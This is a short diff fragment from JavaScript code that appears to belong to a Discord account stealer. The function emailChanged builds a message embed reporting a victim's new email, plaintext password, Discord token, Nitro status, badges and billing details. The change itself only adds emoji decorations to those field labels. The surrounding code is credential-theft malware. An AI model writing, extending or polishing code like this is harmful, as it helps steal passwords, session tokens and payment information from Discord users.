@@ -746,16 +746,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            value: `<:membres:1125950747876536340> New Email: **${email}**\n<:053:1130001947483701348> Password: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<a:1_needle:1111742144160485416> Nitro Type: **${nitro}**\n<:2337blackheart:1116298577799544932> Badges: **${badges}**\n<:crown_b:1111579846070513674> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '**<a:1_broken:1111742193573564528> Token**',
             value: `\`${token}\``,
             inline: false,
           },
